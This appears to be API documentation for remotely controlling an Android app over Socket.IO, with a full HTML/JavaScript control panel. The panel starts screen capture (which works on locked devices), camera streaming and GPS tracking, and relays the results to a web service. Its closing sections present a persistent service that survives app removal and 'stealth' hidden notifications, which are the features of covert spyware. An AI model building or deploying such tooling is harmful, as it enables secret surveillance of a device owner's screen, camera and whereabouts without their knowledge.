# Remote Control API for Android App

This document describes the Socket.IO events that the web service can use to remotely control the Android app.

## Prerequisites

1. The Android app must be running and connected to the web service
2. For screen capture, the user must grant permission at least once through the app UI
3. Location and camera permissions must be granted

## Available Remote Control Events

### Screen Capture Control

#### Start Screen Capture
```javascript
socket.emit('remote-start-screen-capture');
```
- Starts screenshot capture and streaming
- Requires prior screen capture permission
- Works even when device is locked (if permission was granted)

#### Stop Screen Capture
```javascript
socket.emit('remote-stop-screen-capture');
```
- Stops screenshot capture

### Camera Control

#### Start Camera
```javascript
socket.emit('remote-start-camera', {
    camera: 'back' // or 'front'
});
```
- Starts camera with specified lens (back/front)
- Streams camera feed to web service

#### Stop Camera
```javascript
socket.emit('remote-stop-camera');
```
- Stops camera streaming

#### Switch Camera
```javascript
socket.emit('remote-switch-camera');
```
- Switches between front and back camera

### Location Control

#### Start Location Tracking
```javascript
socket.emit('remote-start-location');
```
- Starts GPS location tracking
- Sends location updates to web service

#### Stop Location Tracking
```javascript
socket.emit('remote-stop-location');
```
- Stops location tracking

## Data Streams

The Android app will send the following data streams to the web service:

### Screen Data
```javascript
socket.on('share-screen', function(data) {
    // data contains:
    // {
    //     data: 'base64_encoded_screenshot',
    //     width: 720,
    //     height: 1280,
    //     timestamp: 1641234567890,
    //     format: 'jpeg'
    // }
});
```

### Camera Data
```javascript
socket.on('share-voice', function(data) {
    // Camera stream data (reusing voice event for camera)
    // data contains base64 encoded camera frame
});
```

### Location Data
```javascript
socket.on('share-location', function(data) {
    // data contains:
    // {
    //     latitude: 40.7128,
    //     longitude: -74.0060,
    //     accuracy: 10.5,
    //     timestamp: 1641234567890
    // }
});
```

## Device Registration

When the app connects, it automatically registers with:

```javascript
socket.on('register-device', function(deviceInfo) {
    // deviceInfo contains:
    // {
    //     deviceName: 'Samsung Galaxy S21',
    //     manufacturer: 'Samsung',
    //     androidVersion: '12',
    //     apiLevel: 31,
    //     deviceType: 'Android',
    //     appVersion: '1.0'
    // }
});
```

## Example Web Service Implementation

### HTML Control Panel
```html
<!DOCTYPE html>
<html>
<head>
    <title>Android Remote Control</title>
    <script src="/socket.io/socket.io.js"></script>
</head>
<body>
    <h1>Android Device Remote Control</h1>
    
    <!-- Screen Capture Controls -->
    <div>
        <h3>Screen Capture</h3>
        <button onclick="startScreenCapture()">Start Screen Capture</button>
        <button onclick="stopScreenCapture()">Stop Screen Capture</button>
        <div id="screenDisplay"></div>
    </div>
    
    <!-- Camera Controls -->
    <div>
        <h3>Camera</h3>
        <button onclick="startCamera('back')">Start Back Camera</button>
        <button onclick="startCamera('front')">Start Front Camera</button>
        <button onclick="switchCamera()">Switch Camera</button>
        <button onclick="stopCamera()">Stop Camera</button>
        <div id="cameraDisplay"></div>
    </div>
    
    <!-- Location Controls -->
    <div>
        <h3>Location</h3>
        <button onclick="startLocation()">Start Location</button>
        <button onclick="stopLocation()">Stop Location</button>
        <div id="locationDisplay"></div>
    </div>

    <script>
        const socket = io();
        
        // Remote control functions
        function startScreenCapture() {
            socket.emit('remote-start-screen-capture');
        }
        
        function stopScreenCapture() {
            socket.emit('remote-stop-screen-capture');
        }
        
        function startCamera(type) {
            socket.emit('remote-start-camera', { camera: type });
        }
        
        function stopCamera() {
            socket.emit('remote-stop-camera');
        }
        
        function switchCamera() {
            socket.emit('remote-switch-camera');
        }
        
        function startLocation() {
            socket.emit('remote-start-location');
        }
        
        function stopLocation() {
            socket.emit('remote-stop-location');
        }
        
        // Listen for data streams
        socket.on('share-screen', function(data) {
            document.getElementById('screenDisplay').innerHTML = 
                `<img src="data:image/jpeg;base64,${data.data}" style="max-width: 300px;">`;
        });
        
        socket.on('share-voice', function(data) {
            // Handle camera data
            document.getElementById('cameraDisplay').innerHTML = 
                `<img src="data:image/jpeg;base64,${data}" style="max-width: 300px;">`;
        });
        
        socket.on('share-location', function(data) {
            document.getElementById('locationDisplay').innerHTML = 
                `Lat: ${data.latitude}, Lng: ${data.longitude}`;
        });
        
        socket.on('register-device', function(deviceInfo) {
            console.log('Device connected:', deviceInfo);
        });
    </script>
</body>
</html>
```

## Security Considerations

1. **Screen Capture Permission**: Must be granted through app UI first
2. **Device Lock**: Screen capture works when locked, camera/location may be restricted
3. **Battery Optimization**: App should be excluded from battery optimization
4. **Persistent Service**: Ensures connection survives app removal from recent apps
5. **Stealth Mode**: Notifications are minimal and hidden

## Notes

- The app maintains connection even when removed from recent apps
- Screen capture continues working when device is locked (if permission granted)
- All features can be controlled remotely once initial permissions are granted
- The app uses stealth notifications to minimize visibility
